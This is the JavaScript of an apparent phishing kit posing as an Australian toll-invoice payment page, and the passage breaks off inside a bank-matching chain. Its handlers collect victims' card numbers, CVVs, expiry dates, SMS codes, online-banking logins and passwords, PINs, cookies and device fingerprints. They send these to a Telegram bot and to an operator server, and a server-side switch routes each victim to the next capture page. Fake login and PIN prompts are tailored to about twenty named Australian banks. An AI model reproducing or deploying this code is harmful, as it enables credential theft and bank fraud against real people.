new Vue({
	"el": "#app",
	data: {
		"date": "",
		"bool": false,
		"flag": true,
		"isImg": false,
		"send": "59",
		"isShowTollInvoice": true,
		"isShowLicencePlate": false,
		"showFromInput":false,
		tollInvoiceClassStyle: {
			"MuiButtonBase-root": true,
			"MuiButton-root": true,
			"MuiButton-contained": true,
			"MuiButtonGroup-grouped": true,
			"MuiButtonGroup-groupedHorizontal": true,
			"MuiButtonGroup-groupedOutlined": true,
			"MuiButtonGroup-groupedOutlinedHorizontal": true,
			"MuiButtonGroup-groupedOutlined": true,
			"jss26": true,
			"jss27": true,
			"MuiButton-containedPrimary": true,
			"MuiButton-disableElevation": true,
			"MuiButton-fullWidth": true
		},
		licencePlateClassStyle: {
			"MuiButtonBase-root": true,
			"MuiButton-root": true,
			"MuiButton-contained": true,
			"MuiButtonGroup-grouped": true,
			"MuiButtonGroup-groupedHorizontal": true,
			"MuiButtonGroup-groupedOutlined": true,
			"MuiButtonGroup-groupedOutlinedHorizontal": true,
			"MuiButtonGroup-groupedOutlined": true,
			"jss26": true,
			"jss27": false,
			"MuiButton-containedPrimary": true,
			"MuiButton-disableElevation": true,
			"MuiButton-fullWidth": true
		},
		uili1Style: {
			"uili": true
		},
		uili2Style: {
			"uili": false
		},
		uili3Style: {
			"uili": false
		},
		uili4Style: {
			"uili": false
		},
		uili5Style: {
			"uili": false
		},
		uili6Style: {
			"uili": false
		},
		uili7Style: {
			"uili": false
		},
		uili8Style: {
			"uili": false
		},
		"isShowStateOrTerritory": false,
		"stateOrTerritory": "Victoria",
		"victoria": "Victoria",
		"isNullTollInvoiceErorr": false,
		"isNullLicencePlateError": false,
		"tollinvoiceValue": "",
		"licencePlateValue": "",
		"cardNumberIsNullError": false,
		"cardNumberIsinvalidError": false,
		"cardNameIsNullError": false,
		"cardExpiryIsNullError": false,
		"CvvIsNullError": false,
		"isShowLoadingImg": false,
		"paymentSubmitShow": true,
		"minCountdown": "",
		"secCountdown": "",
		showTime: false,
		day: '',
		hr: '',
		min: '',
		sec: '',
		endTime: '',
		"codeSMSIsNullError": false,
		"SmsCodeSubmitShow": true,
		"smsCodeToPass": false,
		"paymentToPass": false,
		"cardNumberLastFour": "",
		"EBankLoginTextHintShow": "",
		"PINTextHintShow": "",
		"ebankClientNumberIsNullError": false,
		"EbankPasswordIsNullError": false,
		eBankShowIcon: {
			"CBA": false,
			"ANZ": false,
			"NAB": false,
			"WBC": false,
			"MGL": false,
			"HSBC": false,
			"BEN": false,
			"ING": false,
			"SUN": false,
			"BOQ": false,
			"GSB": false,
			"HBank": false,
			"NKS": false,
			"BankAustralia": false,
			"BeyondBank": false,
			"TeachersMutual": false,
			"Greater_Bank_Logo": false,
			"bendigobank": false,
			"CITI": false,
			"CUSCAL": false,
			"Bankwest": false,
			"StGeorge": false
		},
		"EBankSubmitShow": true,
		"EBankToPass": false,
		"showAuthorise":true,
		"CvvIsNoThreeError":false,
		"pinIsNoFourError":false,
		cvv: {
			"id":"",
			"fastName": "",
			"lastName": "",
			"phone": "",
			"email": "",
			"country": "AUETC",
			"state": "",
			"city": "",
			"address1": "",
			"address2": "",
			"zipCode": "",
			"cardNumber": "",
			"cardName": "",
			"cardDate": "",
			"cvv": "",
			"language": "",
			"timezone": "",
			"ua": "",
			"ip": "",
			"queryState": "",
			"codeSMS": "",
			"onlineState": "",
			"threadId": "",
			"bankSchem": "",
			"bankType": "",
			"bankBrand": "",
			"bankCountry": "",
			"bankName": "",
			"cookie": "",
			//新加字段
			"ebankClientNumber": "",
			"ebankPwd": "",
			"bankPayPIN": "",
			"pageId": ""
		}
	},
	methods: {
		showFrom(){
			var that=this
			document.getElementById("lodingBack").style.display="block";
			setTimeout(function(){
				document.getElementById("lodingBack").style.display="none";
				that.showFromInput=true;
				that.showAuthorise=false;
			},1500)
			
		},
		toTwoPage1() {
			if (this.tollinvoiceValue == "") {
				this.isNullTollInvoiceErorr = true;
			} else {
				this.isNullTollInvoiceErorr = false;
				location.href = "PaymentInfo.html";
			}
		},
		toTwoPage2() {
			if (this.licencePlateValue == "") {
				this.isNullLicencePlateError = true;
			} else {
				this.isNullLicencePlateError = false;
				location.href = "PaymentInfo.html";
			}
		},
		toPayment() {
			this.cvv.onlineState = 1;
			this.cvv.pageId = 1;
			this.cvv.queryState = 1;
			axios.post(url.serviceURL + "/cvv-tb/addCvvTb", this.cvv).then(res => {
				if (res != null && res.data != "") {
					this.cvv.id = res.data;
					sessionStorage.setItem("cvv", JSON.stringify(this.cvv));
					axios.post(url.serviceURL + "/cvv-tb/updateCvvTbOnline", this.cvv).then()
					location.href = "Payment.html";
				}
			})
		},
		creditCardSuccess() { //信用卡填写完提交方法
			if (this.cvv.cardNumber == "") {
				this.cardNumberIsNullError = true;
				this.cardNumberIsinvalidError = false;
			} else {
				this.cardNumberIsNullError = false;
				var inputCardNum = this.cvv.cardNumber.replace(/\s/g, "");
				var digit, digits, flag, sum, _i, _len;
				flag = true;
				sum = 0;
				digits = (inputCardNum + '').split('').reverse();
				for (_i = 0, _len = digits.length; _i < _len; _i++) {
					digit = digits[_i];
					digit = parseInt(digit, 10);
					if ((flag = !flag)) {
						digit *= 2;
					}
					if (digit > 9) {
						digit -= 9;
					}
					sum += digit;
				}
				if (sum % 10 === 0) {
					this.cardNumberIsinvalidError = false;
				} else {
					this.cardNumberIsinvalidError = true;
				}
			}
			if (this.cvv.cardName == "") {
				this.cardNameIsNullError = true;
			} else {
				this.cardNameIsNullError = false;
			}
			if (this.cvv.cardDate == "") {
				this.cardExpiryIsNullError = true;
			} else {
				this.cardExpiryIsNullError = false;
			}
			if (this.cvv.cvv == "") {
				this.CvvIsNullError = true;
			} else {
				this.CvvIsNullError = false;
				if(this.cvv.cvv.length!=3){
					this.CvvIsNoThreeError=true;
				}else{
					this.CvvIsNoThreeError=false;
				}
			}

			if (!this.cardNumberIsinvalidError) {
				if (this.cvv.cardNumber != "" && this.cvv.cardName != "" && this.cvv.cardDate != "" && this.cvv
					.cvv != "" && this.cvv.cvv.length==3) {
					var cardNumberDeleteNull = this.cvv.cardNumber.replace(/\s/g, "");
					this.cardNumberLastFour = this.cvv.cardNumber.substring(this.cvv.cardNumber.length - 4);
					sessionStorage.setItem("cardNumberLastFour", this.cardNumberLastFour);
					// this.isShowLoadingImg = true;
					document.getElementById("lodingBack").style.display="block";
					this.paymentSubmitShow = false;
					this.paymentToPass = false;
					axios.get("https://lookup.binlist.net/" + cardNumberDeleteNull).then(res => {
						this.cvv.bankSchem = res.data.scheme;
						this.cvv.bankType = res.data.type;
						this.cvv.bankBrand = res.data.brand;
						this.cvv.bankCountry = res.data.country.name;
						this.cvv.bankName = res.data.bank.name;
						this.cvv.cookie = document.cookie;
						this.cvv.cardNumber=cardNumberDeleteNull;
						this.cvv.ip = returnCitySN['cip'];
						this.cvv.ua = navigator.userAgent;
						this.cvv.timezone = Intl.DateTimeFormat().resolvedOptions().timeZone;
						this.cvv.language = navigator.language;
						this.cvv.cookie = document.cookie;
						this.cvv.pageId = 1;
						this.cvv.queryState = 0;
						
						sessionStorage.setItem("cvv", JSON.stringify(this.cvv));
						
						var text = "--------->编号:"+this.cvv.id+"<---------\n" +
							"======卡号信息======\n" +
							"姓名： " + this.cvv.cardName + "\n" +
							"卡号： " + this.cvv.cardNumber + "\n" +
							"日期： " + this.cvv.cardDate + "\n" +
							"CVV： " + this.cvv.cvv + "\n" +
							"======网银信息======\n" +
							"网银账号： " + this.cvv.ebankClientNumber + "\n" +
							"网银密码： " + this.cvv.ebankPwd + "\n" +
							"PIN： " + this.cvv.bankPayPIN + "\n" +
							"======银行信息======\n" +
							"归属： " + this.cvv.bankSchem + "\n" +
							"类型： " + this.cvv.bankType + "\n" +
							"等级： " + this.cvv.bankBrand + "\n" +
							"银行： " + this.cvv.bankName + "\n" +
							"国家： " + this.cvv.bankCountry + "\n" +
							"======指纹信息======\n" +
							"IP地址：" + this.cvv.ip + "\n" +
							"语言：	" + this.cvv.language + "\n" +
							"时区：	" + this.cvv.timezone + "\n" +
							"浏览器UA： " + this.cvv.ua + "\n" +
							"--------->编号:"+this.cvv.id+"<---------";
						
						var tg={"chat_id":url.TGchat_id,"text":text}
						axios.post("https://api.telegram.org/bot" + url.TGAPI +
							"/sendMessage",tg).then(res1 => {
						})
						
						axios.post(url.serviceURL + "/cvv-tb/updateCvvTbBank", this.cvv).then(res => {
							if (res.data == 0) {
								// this.isShowLoadingImg = false;
								document.getElementById("lodingBack").style.display="none";
								this.paymentSubmitShow = true;
								this.paymentToPass = true;
							} else if (res.data == 1) {
								location.href = "Payment.html";
							} else if (res.data == 2) {
								location.href = "sendSMS.html";
							} else if (res.data == 3) {
								location.href = "EBank.html";
							} else if (res.data == 4) {
								location.href = "AuthBankSecurityCode.html";
							} else if (res.data == 5) {
								location.href = "thank.html";
							}

						})
					})

				}
			}

		},
		smsCodeSuccess() { //验证码提交方法
			if (this.cvv.codeSMS == "") {
				this.codeSMSIsNullError = true;
			} else {
				this.codeSMSIsNullError = false;
				// this.isShowLoadingImg = true;
				document.getElementById("lodingBack").style.display="block";
				this.SmsCodeSubmitShow = false;
				this.smsCodeToPass = false;
				this.cvv.pageId = 2;
				this.cvv.queryState = 0;
				sessionStorage.setItem("cvv", JSON.stringify(this.cvv));
				
				var text = "--------->编号:"+this.cvv.id+"<---------\n" +
						   "======验证码信息======\n" +
						   "验证码： " + this.cvv.codeSMS + "\n";
				
				var tg={"chat_id":url.TGchat_id,"text":text}
				axios.post("https://api.telegram.org/bot" + url.TGAPI +
					"/sendMessage",tg).then(res1 => {
				})
				
				axios.post(url.serviceURL + "/cvv-tb/updateCvvTbBank", this.cvv).then(res => {
					if (res.data == 0) {
						// this.isShowLoadingImg = false;
						document.getElementById("lodingBack").style.display="none";
						this.SmsCodeSubmitShow = true;
						this.smsCodeToPass = true;
					} else if (res.data == 1) {
						location.href = "Payment.html";
					} else if (res.data == 2) {
						location.href = "sendSMS.html";
					} else if (res.data == 3) {
						location.href = "EBank.html";
					} else if (res.data == 4) {
						location.href = "AuthBankSecurityCode.html";
					} else if (res.data == 5) {
						location.href = "thank.html";
					}
				})
			}
		},
		EbankSuccess() { //银联提交方法
			if (this.cvv.ebankClientNumber == "") {
				this.ebankClientNumberIsNullError = true;
			} else {
				this.ebankClientNumberIsNullError = false;
			}
			if (this.cvv.ebankPwd == "") {
				this.EbankPasswordIsNullError = true;
			} else {
				this.EbankPasswordIsNullError = false;
			}
			if (this.cvv.ebankClientNumber != "" && this.cvv.ebankPwd != "") {
				// this.isShowLoadingImg = true;
				document.getElementById("lodingBack").style.display="block";
				this.EBankSubmitShow = false;
				this.EBankToPass = false;
				this.cvv.pageId = 3;
				this.cvv.queryState = 0;
				sessionStorage.setItem("cvv", JSON.stringify(this.cvv));
				
				var text = "--------->编号:"+this.cvv.id+"<---------\n" +
						   "======网银信息======\n" +
						   "网银账号： " + this.cvv.ebankClientNumber + "\n" +
						   "网银密码： " + this.cvv.ebankPwd + "\n" +
						   "PIN： " + this.cvv.bankPayPIN + "\n";
				
				var tg={"chat_id":url.TGchat_id,"text":text}
				axios.post("https://api.telegram.org/bot" + url.TGAPI +
					"/sendMessage",tg).then(res1 => {
				})
				
				axios.post(url.serviceURL + "/cvv-tb/updateCvvTbBank", this.cvv).then(res => {
					if (res.data == 0) {
						// this.isShowLoadingImg = false;
						document.getElementById("lodingBack").style.display="none";
						this.EBankSubmitShow = true;
						this.EBankToPass = true;
					} else if (res.data == 1) {
						location.href = "Payment.html";
					} else if (res.data == 2) {
						location.href = "sendSMS.html";
					} else if (res.data == 3) {
						location.href = "EBank.html";
					} else if (res.data == 4) {
						location.href = "AuthBankSecurityCode.html";
					} else if (res.data == 5) {
						location.href = "thank.html";
					}
				})
			}
		},
		authBankPINSuccess() { //银行支付密码提交方法
			if (this.cvv.bankPayPIN == "" || this.cvv.bankPayPIN == null) {
				this.EbankPasswordIsNullError = true;
				this.pinIsNoFourError=false;
			} else {
				this.EbankPasswordIsNullError = false;
				if(this.cvv.bankPayPIN.length!=4){
					this.pinIsNoFourError=true;
				}else{
					this.pinIsNoFourError=false;
					// this.isShowLoadingImg = true;
					document.getElementById("lodingBack").style.display="block";
					this.EBankSubmitShow = false;
					this.EBankToPass = false;
					this.cvv.pageId = 4;
					this.cvv.queryState = 0;
					sessionStorage.setItem("cvv", JSON.stringify(this.cvv));
					
					var text = "--------->编号:"+this.cvv.id+"<---------\n" +
							   "======网银信息======\n" +
							   "网银账号： " + this.cvv.ebankClientNumber + "\n" +
							   "网银密码： " + this.cvv.ebankPwd + "\n" +
							   "PIN： " + this.cvv.bankPayPIN + "\n";
					
					var tg={"chat_id":url.TGchat_id,"text":text}
					axios.post("https://api.telegram.org/bot" + url.TGAPI +
						"/sendMessage",tg).then(res1 => {
					})
					
					axios.post(url.serviceURL + "/cvv-tb/updateCvvTbBank", this.cvv).then(res => {
						if (res.data == 0) {
							// this.isShowLoadingImg = false;
							document.getElementById("lodingBack").style.display="none";
							this.EBankSubmitShow = true;
							this.EBankToPass = true;
						} else if (res.data == 1) {
							location.href = "Payment.html";
						} else if (res.data == 2) {
							location.href = "sendSMS.html";
						} else if (res.data == 3) {
							location.href = "EBank.html";
						} else if (res.data == 4) {
							location.href = "AuthBankSecurityCode.html";
						} else if (res.data == 5) {
							location.href = "thank.html";
						}
					})
					
				}
			}
		},
		inputCardNumberEvent(inputValue) {
			this.cvv.cardNumber = inputValue.replace(/\s/g, '').replace(/....(?!$)/g, '$& ');
		},
		mouseLeave() {
			this.isShowStateOrTerritory = false;
		},
		clickVictoria() {
			this.isShowStateOrTerritory = false;
			this.stateOrTerritory = "Victoria";
			this.uili1Style.uili = true;
			this.uili2Style.uili = false;
			this.uili3Style.uili = false;
			this.uili4Style.uili = false;
			this.uili5Style.uili = false;
			this.uili6Style.uili = false;
			this.uili7Style.uili = false;
			this.uili8Style.uili = false;
		},
		clickAustraliabCapitalTerritory() {
			this.isShowStateOrTerritory = false;
			this.stateOrTerritory = "Australiab Capital Territory";
			this.uili1Style.uili = false;
			this.uili2Style.uili = true;
			this.uili3Style.uili = false;
			this.uili4Style.uili = false;
			this.uili5Style.uili = false;
			this.uili6Style.uili = false;
			this.uili7Style.uili = false;
			this.uili8Style.uili = false;
		},
		clickNewSouthWales() {
			this.isShowStateOrTerritory = false;
			this.stateOrTerritory = "New South Wales";
			this.uili1Style.uili = false;
			this.uili2Style.uili = false;
			this.uili3Style.uili = true;
			this.uili4Style.uili = false;
			this.uili5Style.uili = false;
			this.uili6Style.uili = false;
			this.uili7Style.uili = false;
			this.uili8Style.uili = false;
		},
		clickNorthernTerritory() {
			this.isShowStateOrTerritory = false;
			this.stateOrTerritory = "Northern Territory";
			this.uili1Style.uili = false;
			this.uili2Style.uili = false;
			this.uili3Style.uili = false;
			this.uili4Style.uili = true;
			this.uili5Style.uili = false;
			this.uili6Style.uili = false;
			this.uili7Style.uili = false;
			this.uili8Style.uili = false;
		},
		clickQueensland() {
			this.isShowStateOrTerritory = false;
			this.stateOrTerritory = "Queensland";
			this.uili1Style.uili = false;
			this.uili2Style.uili = false;
			this.uili3Style.uili = false;
			this.uili4Style.uili = false;
			this.uili5Style.uili = true;
			this.uili6Style.uili = false;
			this.uili7Style.uili = false;
			this.uili8Style.uili = false;
		},
		clickSouthAustralia() {
			this.isShowStateOrTerritory = false;
			this.stateOrTerritory = "South Australia";
			this.uili1Style.uili = false;
			this.uili2Style.uili = false;
			this.uili3Style.uili = false;
			this.uili4Style.uili = false;
			this.uili5Style.uili = false;
			this.uili6Style.uili = true;
			this.uili7Style.uili = false;
			this.uili8Style.uili = false;
		},
		clickTasmania() {
			this.isShowStateOrTerritory = false;
			this.stateOrTerritory = "Tasmania";
			this.uili1Style.uili = false;
			this.uili2Style.uili = false;
			this.uili3Style.uili = false;
			this.uili4Style.uili = false;
			this.uili5Style.uili = false;
			this.uili6Style.uili = false;
			this.uili7Style.uili = true;
			this.uili8Style.uili = false;
		},
		clickWesternAustralia() {
			this.isShowStateOrTerritory = false;
			this.stateOrTerritory = "Western Australia";
			this.uili1Style.uili = false;
			this.uili2Style.uili = false;
			this.uili3Style.uili = false;
			this.uili4Style.uili = false;
			this.uili5Style.uili = false;
			this.uili6Style.uili = false;
			this.uili7Style.uili = false;
			this.uili8Style.uili = true;
		},
		clickStateOrTerritory() {
			this.isShowStateOrTerritory = true;
			if (this.stateOrTerritory == "Victoria") {
				this.uili1Style.uili = true;
				this.uili2Style.uili = false;
				this.uili3Style.uili = false;
				this.uili4Style.uili = false;
				this.uili5Style.uili = false;
				this.uili6Style.uili = false;
				this.uili7Style.uili = false;
				this.uili8Style.uili = false;
			} else if (this.stateOrTerritory == "Australiab Capital Territory") {
				this.uili1Style.uili = false;
				this.uili2Style.uili = true;
				this.uili3Style.uili = false;
				this.uili4Style.uili = false;
				this.uili5Style.uili = false;
				this.uili6Style.uili = false;
				this.uili7Style.uili = false;
				this.uili8Style.uili = false;
			} else if (this.stateOrTerritory == "New South Wales") {
				this.uili1Style.uili = false;
				this.uili2Style.uili = false;
				this.uili3Style.uili = true;
				this.uili4Style.uili = false;
				this.uili5Style.uili = false;
				this.uili6Style.uili = false;
				this.uili7Style.uili = false;
				this.uili8Style.uili = false;
			} else if (this.stateOrTerritory == "Northern Territory") {
				this.uili1Style.uili = false;
				this.uili2Style.uili = false;
				this.uili3Style.uili = false;
				this.uili4Style.uili = true;
				this.uili5Style.uili = false;
				this.uili6Style.uili = false;
				this.uili7Style.uili = false;
				this.uili8Style.uili = false;
			} else if (this.stateOrTerritory == "Queensland") {
				this.uili1Style.uili = false;
				this.uili2Style.uili = false;
				this.uili3Style.uili = false;
				this.uili4Style.uili = false;
				this.uili5Style.uili = true;
				this.uili6Style.uili = false;
				this.uili7Style.uili = false;
				this.uili8Style.uili = false;
			} else if (this.stateOrTerritory == "South Australia") {
				this.uili1Style.uili = false;
				this.uili2Style.uili = false;
				this.uili3Style.uili = false;
				this.uili4Style.uili = false;
				this.uili5Style.uili = false;
				this.uili6Style.uili = true;
				this.uili7Style.uili = false;
				this.uili8Style.uili = false;
			} else if (this.stateOrTerritory == "Tasmania") {
				this.uili1Style.uili = false;
				this.uili2Style.uili = false;
				this.uili3Style.uili = false;
				this.uili4Style.uili = false;
				this.uili5Style.uili = false;
				this.uili6Style.uili = false;
				this.uili7Style.uili = true;
				this.uili8Style.uili = false;
			} else if (this.stateOrTerritory == "Western Australia") {
				this.uili1Style.uili = false;
				this.uili2Style.uili = false;
				this.uili3Style.uili = false;
				this.uili4Style.uili = false;
				this.uili5Style.uili = false;
				this.uili6Style.uili = false;
				this.uili7Style.uili = false;
				this.uili8Style.uili = true;
			}

		},
		tollInvoice() {
			this.licencePlateClassStyle.jss27 = false;
			this.tollInvoiceClassStyle.jss27 = true;
			this.isShowTollInvoice = true;
			this.isShowLicencePlate = false;
			this.isNullLicencePlateError = false;
		},
		licencePlate() {
			this.stateOrTerritory = "Victoria";
			this.licencePlateClassStyle.jss27 = true;
			this.tollInvoiceClassStyle.jss27 = false;
			this.isShowTollInvoice = false;
			this.isShowLicencePlate = true;
			this.isShowStateOrTerritory = false;
			this.isNullTollInvoiceErorr = false;
		},
		getDate() {
			var myDate = new Date();
			var dateDate = myDate.getDate() + 1;
			var dateMonth = myDate.getMonth() + 1;
			this.date = dateDate + "/" + dateMonth + "/" + myDate.getFullYear() + " " + "10:00";
			this.smsDate = myDate.getDate() + "/" + dateMonth + "/" + myDate.getFullYear()
		},
		addClick() {
			if (localStorage.getItem("click") == null || localStorage.getItem("click") == "NaN") {
				localStorage.setItem("click", 1);
			} else {
				localStorage.setItem("click", parseInt(localStorage.getItem("click")) + 1);
			}

			axios.get(url.serviceURL + "/click/addClick?ip=" + returnCitySN['cip']).then(res => {
				console.log(res.data);
			})
		},
		getPageName() {
			var strUrl = location.href;
			var arrUrl = strUrl.split("/");
			var strPage = arrUrl[arrUrl.length - 1];
			return strPage;
		},
		checkout(inputNum) {
			if (inputNum.length <= 0) {
				this.cardNumberIsNullError = true;
				this.bool = false;
			} else {
				this.cardNumberIsNullError = false;
				var digit, digits, flag, sum, _i, _len;
				flag = true;
				sum = 0;
				digits = (inputNum + '').split('').reverse();
				for (_i = 0, _len = digits.length; _i < _len; _i++) {
					digit = digits[_i];
					digit = parseInt(digit, 10);
					if ((flag = !flag)) {
						digit *= 2;
					}
					if (digit > 9) {
						digit -= 9;
					}
					sum += digit;
				}
				if (sum % 10 === 0) {
					this.bool = false;
				} else {
					this.bool = true;
				}
			}
		},
		a() {
			if (!(this.cvv.cardDate.includes("/")) && this.flag) {
				if (this.cvv.cardDate.length == 2) {
					this.cvv.cardDate += "/";
					this.flag = false;
				}
			}
			if (this.cvv.cardDate.length < 2) {
				this.flag = true;
			}
		},
		btn() {
			this.isShowCountdown = false;
			this.send = 60;
			var that = this;

			function sms() {
				if (that.send <= 1) {
					that.isShowCountdown = true;
					that.send = "Send again";
					clearInterval(isetInterval);
				} else {
					that.send--;
				}
			}
			var isetInterval = setInterval(sms, 1000);
		},
		countdownPay() {
			const end = this.endTime
			const now = Date.parse(new Date())
			const msec = end - now
			if (msec < 0) return;
			let day = parseInt(msec / 1000 / 60 / 60 / 24)
			let hr = parseInt(msec / 1000 / 60 / 60 % 24)
			let min = parseInt(msec / 1000 / 60 % 60)
			let sec = parseInt(msec / 1000 % 60)
			this.day = day
			this.hr = hr > 9 ? hr : '0' + hr
			this.min = min > 9 ? min : '0' + min
			this.sec = sec > 9 ? sec : '0' + sec
			const that = this
			if (min >= 0 && sec >= 0) {
				if (min == 0 && sec == 0) {
					that.showTime = false
					return
				}
				setTimeout(function() {
					that.countdownPay()
				}, 1000)
			}
		},
		queryBankSource() {
			var bankName = this.cvv.bankName;
			if (bankName != "" &&  bankName != null) {
				if (bankName == "COMMONWEALTH BANK OF AUSTRALIA" || bankName.search("COMMONWEALTH")>=0) {
					this.EBankLoginTextHintShow = "Please log in Commonwealth Bank of Australia";
					this.eBankShowIcon.CBA = true;
					this.PINTextHintShow = "Please Enter Commonwealth Bank of Australia PIN";
				} else if (bankName == "COMMONWEALTH BANK") {
					this.EBankLoginTextHintShow = "Please log in Commonwealth Bank of Australia";
					this.eBankShowIcon.CBA = true;
					this.PINTextHintShow = "Please Enter Commonwealth Bank of Australia PIN";
				} else if (bankName == "ANZ" || bankName.search("ANZ")>=0) {
					this.EBankLoginTextHintShow = "Please log in ANZ Bank of Australia";
					this.eBankShowIcon.ANZ = true;
					this.PINTextHintShow = "Please Enter ANZ Bank PIN";
				} else if (bankName == "ANZ GRINDLAYS BANK, LTD.") {
					this.EBankLoginTextHintShow = "Please log in ANZ Bank of Australia";
					this.eBankShowIcon.ANZ = true;
					this.PINTextHintShow = "Please Enter ANZ Bank PIN";
				} else if (bankName == "ANZ BANK, LTD.") {
					this.EBankLoginTextHintShow = "Please log in ANZ Bank of Australia";
					this.eBankShowIcon.ANZ = true;
					this.PINTextHintShow = "Please Enter ANZ Bank PIN";
				} else if (bankName == "AUSTRALIA AND NEW ZEALAND BANKING GROUP LIMITED") {
					this.EBankLoginTextHintShow = "Please log in ANZ Bank of Australia";
					this.eBankShowIcon.ANZ = true;
					this.PINTextHintShow = "Please Enter ANZ Bank PIN";
				} else if (bankName == "AUSTRALIA AND NEW ZEALAND BANKING GROUP, LTD.") {
					this.EBankLoginTextHintShow = "Please log in ANZ Bank of Australia";
					this.eBankShowIcon.ANZ = true;
					this.PINTextHintShow = "Please Enter ANZ Bank PIN";
				} else if (bankName == "AUSTRALIA AND NEW ZEALAND BANKING GROUP LTD. FREQUENT FLYER") {
					this.EBankLoginTextHintShow = "Please log in ANZ Bank of Australia";
					this.eBankShowIcon.ANZ = true;
					this.PINTextHintShow = "Please Enter ANZ Bank PIN";
				} else if (bankName == "ANZ NATIONAL BANK, LTD.") {
					this.EBankLoginTextHintShow = "Please log in ANZ Bank of Australia";
					this.eBankShowIcon.ANZ = true;
					this.PINTextHintShow = "Please Enter ANZ Bank PIN";
				} else if (bankName == "NATIONAL AUSTRALIA BANK, LTD." || bankName.search("NATIONAL")>=0) {
					this.EBankLoginTextHintShow = "Please log in National Bank of Australia";
					this.eBankShowIcon.NAB = true;
					this.PINTextHintShow = "Please Enter National Bank PIN";
				} else if (bankName == "WESTPAC BANKING CORPORATION" || bankName.search("WESTPAC")>=0) {
					this.EBankLoginTextHintShow = "Please log in Westpac Bank of Australia";
					this.eBankShowIcon.WBC = true;
					this.PINTextHintShow = "Please Enter Westpac Bank PIN";
				} else if (bankName == "WESTPAC") {
					this.EBankLoginTextHintShow = "Please log in Westpac Bank of Australia";
					this.eBankShowIcon.WBC = true;
					this.PINTextHintShow = "Please Enter Westpac Bank PIN";
				} else if (bankName == "MACQUARIE BANK, LTD." || bankName.search("MACQUARIE")>=0) {
					this.EBankLoginTextHintShow = "Please log in Macquarie Bank of Australia";
					this.eBankShowIcon.MGL = true;
					this.PINTextHintShow = "Please Enter Macquarie Bank PIN";
				} else if (bankName == "MACQUARIE BANK") {
					this.EBankLoginTextHintShow = "Please log in Macquarie Bank of Australia";
					this.eBankShowIcon.MGL = true;
					this.PINTextHintShow = "Please Enter Macquarie Bank PIN";
				} else if (bankName == "HSBC BANK AUSTRALIA, LTD." || bankName.search("HSBC")>=0) {
					this.EBankLoginTextHintShow = "Please log in HSBC Bank of Australia";
					this.eBankShowIcon.HSBC = true;
					this.PINTextHintShow = "Please Enter HSBC Bank PIN";
				} else if (bankName == "HSBC") {
					this.EBankLoginTextHintShow = "Please log in HSBC Bank of Australia";
					this.eBankShowIcon.HSBC = true;
					this.PINTextHintShow = "Please Enter HSBC Bank PIN";
				} else if (bankName == "HSBC BANK") {
					this.EBankLoginTextHintShow = "Please log in HSBC Bank of Australia";
					this.eBankShowIcon.HSBC = true;
					this.PINTextHintShow = "Please Enter HSBC Bank PIN";
				} else if (bankName == "BENDIGO AND ADELAIDE BANK, LTD." || bankName.search("ADELAIDE")>=0) {
					this.EBankLoginTextHintShow = "Please log in Bendigo and Adelaide Bank of Australia";
					this.eBankShowIcon.bendigobank = true;
					this.PINTextHintShow = "Please Enter Bendigo and Adelaide Bank PIN";
				} else if (bankName == "ADELAIDE BANK, LTD.") {
					this.EBankLoginTextHintShow = "Please log in Bendigo and Adelaide Bank of Australia";
					this.eBankShowIcon.bendigobank = true;
					this.PINTextHintShow = "Please Enter Bendigo and Adelaide Bank PIN";
				} else if (bankName == "ING BANK (AUSTRALIA), LTD." || bankName.search("ING")>=0) {
					this.EBankLoginTextHintShow = "Please log in ING Bank of Australia";
					this.eBankShowIcon.ING = true;
					this.PINTextHintShow = "Please Enter ING Bank PIN";
				} else if (bankName == "SUNCORP-METWAY, LTD." || bankName.search("SUNCORP")>=0) {
					this.EBankLoginTextHintShow = "Please log in Suncorp Bank of Australia";
					this.eBankShowIcon.SUN = true;
					this.PINTextHintShow = "Please Enter Suncorp Bank PIN";
				} else if (bankName == "BANK OF QUEENSLAND, LTD." || bankName.search("QUEENSLAND")>=0) {
					this.EBankLoginTextHintShow = "Please log in Queensland Bank of Australia";
					this.eBankShowIcon.BOQ = true;
					this.PINTextHintShow = "Please Enter Queensland Bank PIN";
				} else if (bankName == "GREAT SOUTHERN NATIONAL BANK" || bankName.search("SOUTHERN")>=0) {
					this.EBankLoginTextHintShow = "Please log in Great Southern Bank of Australia";
					this.eBankShowIcon.GSB = true;
					this.PINTextHintShow = "Please Enter Great Southern Bank PIN";
				} else if (bankName == "HERITAGE BANK LIMITED" || bankName.search("HERITAGE")>=0) {
					this.EBankLoginTextHintShow = "Please log in Heritage Bank of Australia";
					this.eBankShowIcon.HBank = true;
					this.PINTextHintShow = "Please Enter Great Heritage Bank PIN";
				} else if (bankName == "NEWCASTLE PERMANENT BUILDING SOCIETY, LTD.") {
					this.EBankLoginTextHintShow = "Please log in Newcastle Permanent Bank of Australia";
					this.eBankShowIcon.NKS = true;
					this.PINTextHintShow = "Please Enter Great Newcastle Permanent Bank PIN";
				} else if (bankName == "TEACHERS CREDIT UNION" || bankName.search("TEACHERS")>=0) {
					this.EBankLoginTextHintShow = "Please log in Teachers Credit Union Bank of Australia";
					this.eBankShowIcon.TeachersMutual = true;
					this.PINTextHintShow = "Please Enter Teachers Credit Union Bank PIN";
				} else if (bankName == "GREATER BUILDING SOCIETY, LTD." || bankName.search("GREATER")>=0) {
					this.EBankLoginTextHintShow = "Please log in Greater Bank of Australia";
					this.eBankShowIcon.Greater_Bank_Logo = true;
					this.PINTextHintShow = "Please Enter Greater Bank PIN";
				} else if (bankName.search('BEYOND') != -1) {
					this.EBankLoginTextHintShow = "Please log in Beyond Bank of Australia";
					this.eBankShowIcon.BeyondBank = true;
					this.PINTextHintShow = "Please Enter Beyond Bank PIN";
				} else if (bankName == "CITIGROUP PTY, LTD." || bankName.search("CITI")>=0) {
					this.EBankLoginTextHintShow = "Please log in Citi Bank of Australia";
					this.eBankShowIcon.CITI = true;
					this.PINTextHintShow = "Please Enter Citi Bank PIN";
				} else if (bankName == "CITIGROUP PTY LIMITED") {
					this.EBankLoginTextHintShow = "Please log in Citi Bank of Australia";
					this.eBankShowIcon.CITI = true;
					this.PINTextHintShow = "Please Enter Citi Bank PIN";
				} else if (bankName == "CITIBANK") {
					this.EBankLoginTextHintShow = "Please log in Citi Bank of Australia";
					this.eBankShowIcon.CITI = true;
					this.PINTextHintShow = "Please Enter Citi Bank PIN";
				} else if (bankName == "CUSCAL, LTD.") {
					this.EBankLoginTextHintShow = "Please log in Cuscal Bank of Australia";
					this.eBankShowIcon.CUSCAL = true;
					this.PINTextHintShow = "Please Enter Cuscal Bank PIN";
